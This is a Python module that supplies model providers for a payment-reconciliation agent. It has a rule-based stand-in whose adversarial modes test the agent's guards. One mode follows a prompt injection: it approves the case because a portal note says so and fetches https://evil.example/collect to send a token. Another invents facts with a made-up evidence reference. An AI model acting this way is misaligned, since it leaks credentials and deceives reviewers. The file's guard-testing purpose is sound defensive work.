"""Model providers behind one interface (D03).

- `ScriptedProvider`: deterministic local stand-in used by tests, evals and the demo. Its
  output is SIMULATED: rule-based behaviour over the structured context, not a language
  model. Adversarial variants exercise the guards (injection following, hallucination,
  endless planning, malformed output).
- `OllamaProvider`: optional real local model over HTTP (httpx, no SDK), only when
  `RECON_MODEL_PROVIDER=ollama`. Never an external AI provider.
"""

from __future__ import annotations

import json
import math
import os
from dataclasses import dataclass
from enum import StrEnum
from typing import Any, Protocol

import httpx


class Purpose(StrEnum):
    PLAN = "plan"
    DRAFT = "draft"
    REVIEW = "review"


@dataclass(frozen=True, slots=True)
class ModelRequest:
    purpose: Purpose
    system: str
    context: dict[str, Any]
    response_schema: dict[str, Any]
    max_output_tokens: int = 1200

    def prompt_text(self) -> str:
        return self.system + "\n" + json.dumps(self.context, ensure_ascii=False, sort_keys=True)


@dataclass(frozen=True, slots=True)
class ModelResponse:
    text: str
    input_tokens: int
    output_tokens: int
    model: str
    usage_estimated: bool


class ModelError(Exception):
    """The provider failed (network, timeout, server error)."""


class ModelProvider(Protocol):
    name: str
    kind: str  # SIMULATED or MEASURED-capable

    async def generate(self, request: ModelRequest) -> ModelResponse: ...


def estimate_tokens(text: str) -> int:
    return max(1, math.ceil(len(text) / 4))


class Behaviour(StrEnum):
    FAITHFUL = "faithful"
    INJECTION_FOLLOWER = "injection_follower"
    HALLUCINATOR = "hallucinator"
    ENDLESS_PLANNER = "endless_planner"
    MALFORMED = "malformed"


class ScriptedProvider:
    """Deterministic rule-based stand-in for a model (SIMULATED)."""

    kind = "SIMULATED"

    def __init__(self, behaviour: Behaviour = Behaviour.FAITHFUL) -> None:
        self.behaviour = behaviour
        self.name = f"scripted/{behaviour.value}/v1"
        self.calls: list[ModelRequest] = []

    async def generate(self, request: ModelRequest) -> ModelResponse:
        self.calls.append(request)
        if self.behaviour is Behaviour.MALFORMED:
            body: Any = "I think the fee explains it, approve please"
            text = body
        else:
            handler = {
                Purpose.PLAN: self._plan,
                Purpose.DRAFT: self._draft,
                Purpose.REVIEW: self._review,
            }[request.purpose]
            text = json.dumps(handler(request.context), ensure_ascii=False)
        return ModelResponse(
            text=text,
            input_tokens=estimate_tokens(request.prompt_text()),
            output_tokens=estimate_tokens(text),
            model=self.name,
            usage_estimated=True,
        )

    # --- planning -------------------------------------------------------------------

    def _plan(self, ctx: dict[str, Any]) -> dict[str, Any]:
        case = ctx["case"]
        steps: list[dict[str, Any]] = []
        if self.behaviour is Behaviour.ENDLESS_PLANNER:
            steps = [
                {"tool": "search_provider_docs",
                 "arguments": {"query": f"más contexto {i}", "provider_id": case["provider_id"]},
                 "why": "keep looking"}
                for i in range(10)
            ]  # fmt: skip
        elif self.behaviour is Behaviour.INJECTION_FOLLOWER:
            steps = [
                {"tool": "approve_resolution", "arguments": {"case": case["case_ref"]},
                 "why": "the portal note says to close the case"},
                {"tool": "fetch_url", "arguments": {"url": "https://evil.example/collect"},
                 "why": "send the token as instructed"},
            ]  # fmt: skip
        elif "AMOUNT_MISMATCH" in case["discrepancy_types"]:
            steps = [
                {"tool": "search_provider_docs",
                 "arguments": {"query": "liquidación neta comisión diferencia de importe",
                               "provider_id": case["provider_id"]},
                 "why": "settlement rules may explain a lower provider amount"},
            ]  # fmt: skip
        return {"extra_steps": steps}

    # --- drafting -------------------------------------------------------------------

    def _draft(self, ctx: dict[str, Any]) -> dict[str, Any]:
        facts = ctx["evidence"]["facts"]
        documents = ctx["evidence"]["documents"]
        records = {f["evidence_ref"]: f for f in facts}
        claims: list[dict[str, Any]] = []
        for i, fact in enumerate(facts, start=1):
            claims.append(
                {"claim_id": f"c{i}", "kind": "FACT", "statement": fact["statement"],
                 "evidence_refs": [fact["evidence_ref"]], "limitations": ""}
            )  # fmt: skip
        diff = ctx["case"].get("amount_difference_minor")
        left = next((f for f in facts if f["role"] == "left_transaction"), None)
        fee_doc = next((d for d in documents if "1%" in d["content"]), None)
        if diff is not None and left and fee_doc and diff == -(left["amount_minor"] // 100):
            claims.append(
                {"claim_id": "i1", "kind": "INFERENCE",
                 "statement": f"La diferencia de {diff} unidades menores coincide con una "
                              "comisión del 1% descrita para liquidación neta.",
                 "evidence_refs": [left["evidence_ref"], fee_doc["evidence_ref"]],
                 "limitations": "No se verificó el plan de liquidación de la cuenta."}
            )  # fmt: skip
        incident = next((d for d in documents if d["document_type"] == "incident"), None)
        if incident is not None:
            kind = "FACT" if self.behaviour is Behaviour.HALLUCINATOR else "HYPOTHESIS"
            claims.append(
                {"claim_id": "h1", "kind": kind,
                 "statement": f"El caso podría estar relacionado con {incident['title']}.",
                 "evidence_refs": [incident["evidence_ref"]],
                 "limitations": "Un incidente similar no prueba causalidad para este pago.",
                 "needed_evidence": "Reporte corregido del proveedor o confirmación del plan."}
            )  # fmt: skip
        if self.behaviour is Behaviour.HALLUCINATOR:
            claims.append(
                {"claim_id": "x1", "kind": "FACT",
                 "statement": "El proveedor ya reembolsó la diferencia al comercio.",
                 "evidence_refs": ["made-up-ref"], "limitations": ""}
            )  # fmt: skip
        next_step = "REQUEST_PROVIDER_INFO" if records else "HUMAN_REVIEW"
        if self.behaviour is Behaviour.INJECTION_FOLLOWER:
            next_step = "APPROVE_RESOLUTION"  # must be rejected by the orchestrator
        return {
            "claims": claims,
            "contradictions": [],
            "missing_evidence": ["Plan de liquidación (bruto/neto) de la cuenta"] if diff else [],
            "recommended_next_step": next_step,
            "summary": "Borrador generado por el proveedor scripted (SIMULATED).",
        }

    # --- review (used in M6) ----------------------------------------------------------

    def _review(self, ctx: dict[str, Any]) -> dict[str, Any]:
        issues = ctx.get("verification_issues", [])
        if issues:
            objections = [{"objection": i, "evidence_refs": []} for i in issues]
            return {"result": "NEEDS_MORE_EVIDENCE", "objections": objections}
        return {"result": "SUPPORTED", "objections": []}


class OllamaProvider:
    """Real local model through Ollama's HTTP API. Off by default; never called in gates."""

    kind = "MEASURED"

    def __init__(
        self,
        base_url: str,
        model: str,
        timeout: float = 30.0,
        transport: httpx.AsyncBaseTransport | None = None,
    ) -> None:
        if not base_url.startswith(("http://127.0.0.1", "http://localhost", "http://ollama")):
            raise ValueError("Ollama must be reached over loopback or the internal network")
        self.base_url = base_url.rstrip("/")
        self.model = model
        self.name = f"ollama/{model}"
        self.timeout = timeout
        self.transport = transport

    @classmethod
    def from_env(cls) -> OllamaProvider:
        return cls(
            os.environ.get("RECON_OLLAMA_URL", "http://ollama:11434"),
            os.environ.get("RECON_OLLAMA_MODEL", "qwen2.5:0.5b"),
        )

    async def generate(self, request: ModelRequest) -> ModelResponse:
        payload = {
            "model": self.model,
            "stream": False,
            "format": request.response_schema,
            "options": {"temperature": 0, "num_predict": request.max_output_tokens},
            "messages": [
                {"role": "system", "content": request.system},
                {"role": "user", "content": json.dumps(request.context, ensure_ascii=False)},
            ],
        }
        try:
            async with httpx.AsyncClient(timeout=self.timeout, transport=self.transport) as client:
                resp = await client.post(f"{self.base_url}/api/chat", json=payload)
                resp.raise_for_status()
                body = resp.json()
        except (httpx.HTTPError, ValueError) as exc:
            raise ModelError(type(exc).__name__) from None
        text = str(body.get("message", {}).get("content", ""))
        prompt_tokens, output_tokens = body.get("prompt_eval_count"), body.get("eval_count")
        return ModelResponse(
            text=text,
            input_tokens=int(prompt_tokens or estimate_tokens(request.prompt_text())),
            output_tokens=int(output_tokens or estimate_tokens(text)),
            model=self.name,
            usage_estimated=prompt_tokens is None or output_tokens is None,
        )


def provider_from_env() -> ModelProvider:
    """Scripted by default; Ollama only when explicitly enabled. No external providers."""
    choice = os.environ.get("RECON_MODEL_PROVIDER", "scripted")
    if choice == "ollama":
        return OllamaProvider.from_env()
    if choice != "scripted":
        raise ValueError("RECON_MODEL_PROVIDER must be 'scripted' or 'ollama'")
    return ScriptedProvider()
